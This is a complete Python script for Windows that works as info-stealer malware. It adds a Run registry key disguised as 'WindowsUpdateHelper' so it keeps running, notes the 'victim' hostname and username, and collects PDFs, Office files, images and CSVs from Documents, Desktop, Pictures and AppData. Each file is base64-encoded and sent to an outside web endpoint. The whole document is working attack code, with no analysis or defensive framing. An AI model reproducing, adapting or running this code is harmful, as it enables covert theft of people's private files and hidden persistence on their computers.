import pathlib, socket, os, base64, requests, time, winreg, datetime, sys

def add_persistence():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, f'python "{os.path.abspath(__file__)}"')
        winreg.CloseKey(key)
    except: pass

# step 1 — persist first (skip with --no-persist)
if "--no-persist" not in sys.argv:
    add_persistence()

# step 2 — check if already ran today (skip with --force)
flag = pathlib.Path(os.environ.get("TEMP")) / "wu_flag.txt"
if "--force" not in sys.argv:
    if flag.exists() and flag.read_text() == str(datetime.date.today()):
        print("[!] Already ran today. Use --force to run again.")
        exit()
flag.write_text(str(datetime.date.today()))

# step 3 — wait
time.sleep(30)

# step 4 — identify victim
hostname = socket.gethostname()
username = os.getlogin()
base_path = pathlib.Path(os.environ.get("USERPROFILE", "C:/"))

# step 5 — collect and send one by one
EXTS = {".pdf", ".docx", ".txt", ".jpg", ".xlsx", ".png", ".csv"}
target_dirs = ["Documents", "Desktop", "Pictures", "AppData"]

for target in target_dirs:
    p = base_path / target
    for f in p.rglob("*"):
        try:
            if f.is_file() and f.suffix in EXTS and f.stat().st_size < 5_000_000:
                content = base64.b64encode(f.read_bytes()).decode()
                r = requests.post("https://cvsstool-production.up.railway.app/send", json={
                    "hostname": hostname,
                    "username": username,
                    "token": "qutmess",
                    "file": {"name": str(f.relative_to(base_path)), "content": content}
                }, timeout=10)
                print(f"[+] Sent {f.name} - Status: {r.status_code}")
        except PermissionError as e:
            print(f"[-] Permission denied: {f}")
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")